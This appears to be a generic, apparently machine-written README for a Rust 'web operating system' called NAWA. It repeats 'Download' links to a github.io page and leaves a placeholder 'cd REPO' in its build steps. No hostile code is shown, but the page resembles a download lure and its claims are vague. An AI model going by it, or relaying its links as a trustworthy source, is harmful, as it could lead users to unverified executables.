# NAWA v0.1.0 - web operating system 2026

> **NAWA is a Rust-powered web operating system for Linux that ships with a dual-engine runtime, zero-copy I/O, built-in storage, and HTTP/3 support in version 0.1.0.**

[![Platform](https://img.shields.io/badge/Platform-Linux-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-v0.1.0-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/jordanhub1992/nawa-v010-web-os?style=flat-square)](https://github.com/jordanhub1992/nawa-v010-web-os)

---

<p align="center">
  <a href="https://jordanhub1992.github.io/nawa-v010-web-os/">
    <img src="https://img.shields.io/badge/Download-NAWA%20Latest-brightgreen?style=for-the-badge" alt="Download NAWA">
  </a>
</p>

> **[Direct Download - NAWA v0.1.0](https://jordanhub1992.github.io/nawa-v010-web-os/)**

---

[Download Latest Build](https://jordanhub1992.github.io/nawa-v010-web-os/)

---

## Overview

NAWA is a Linux-oriented web operating system implemented in Rust for teams that want a compact runtime with networking, storage, and execution capabilities brought together in one place. Its dual-engine design and zero-copy I/O focus are intended to reduce overhead as workloads move through the system, while CLI tooling keeps the platform approachable for day-to-day use.

Along with the core runtime, NAWA includes a KV store and document database, a WASM sandbox, and support for HTTP/1.1 plus HTTP/3. That mix makes it a practical fit for developers exploring web-native infrastructure, lean deployments, and runtime architectures that consolidate multiple services into a single binary.

---

## Capabilities

- Dual engine architecture for dividing work across runtime layers
- Zero-copy I/O flow based on io_uring for efficient data movement
- Integrated KV database for key-value storage scenarios
- Integrated document database for structured data handling
- HTTP/1.1 and HTTP/3 support for current web traffic patterns
- WASM sandbox for constrained module execution
- Single-binary deployment to simplify packaging and release
- Prometheus metrics for observability and runtime monitoring
- CLI tooling for setup, control, and routine interaction

---

## Installation

Build the project from source on Linux by cloning the repository and compiling it locally:

```bash
git clone https://github.com/jordanhub1992/nawa-v010-web-os.git
cd REPO
cargo build --release
```

Once compilation finishes, start the generated binary from the release target directory. If you prefer a packaged release, download the latest artifact and run the included executable following the release instructions.

---

## Usage

In a typical setup, you start the service, configure ports or storage locations, and then connect clients or applications through HTTP endpoints.

Example launch flow:

```bash
./target/release/nawa
```

Example operational steps:

1. Start the NAWA binary.
2. Set runtime options for networking and storage.
3. Use the CLI tools to check status or manage services.
4. Connect web clients, WASM modules, or API consumers.
5. Monitor metrics through the Prometheus endpoint if enabled.

For automation, keep the release binary and configuration files in the same place so the runtime starts with stable settings.

---

## Configuration

Runtime settings are expected to come from config files or CLI flags, depending on how the binary is packaged. One simple layout looks like this:

```toml
[server]
host = "0.0.0.0"
port = 8080

[storage]
kv_path = "./data/kv"
document_path = "./data/doc"

[metrics]
enabled = true
```

If your deployment relies on environment variables or launch arguments rather than config files, keep that approach consistent across environments so the single-binary workflow remains predictable.

---

## Requirements

- Linux platform
- Rust toolchain for source builds
- io_uring-capable kernel support for the zero-copy runtime path
- Enough memory for your workload; the project metadata indicates it can run on 512MB VPS environments
- Storage space for the binary, data files, and logs
- Network access if you plan to expose HTTP services or remote clients

---

## FAQ

**How do I get support?**  
Open an issue in the repository or use the project's preferred discussion channel if one is provided by the maintainers.

**How do I stay current with updates?**  
Check releases regularly and replace the binary with the newest build when a new version is published.

**Where are settings stored?**  
Settings are typically kept in config files, startup arguments, or environment variables, depending on your deployment style.

**What should I do if the service does not start?**  
Verify Linux compatibility, confirm the Rust build succeeded, check kernel support for io_uring, and review logs or metrics for startup errors.

**Can I change the runtime layout?**  
Yes, deployment details such as ports, storage locations, and monitoring options are usually adjusted through configuration or CLI options.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
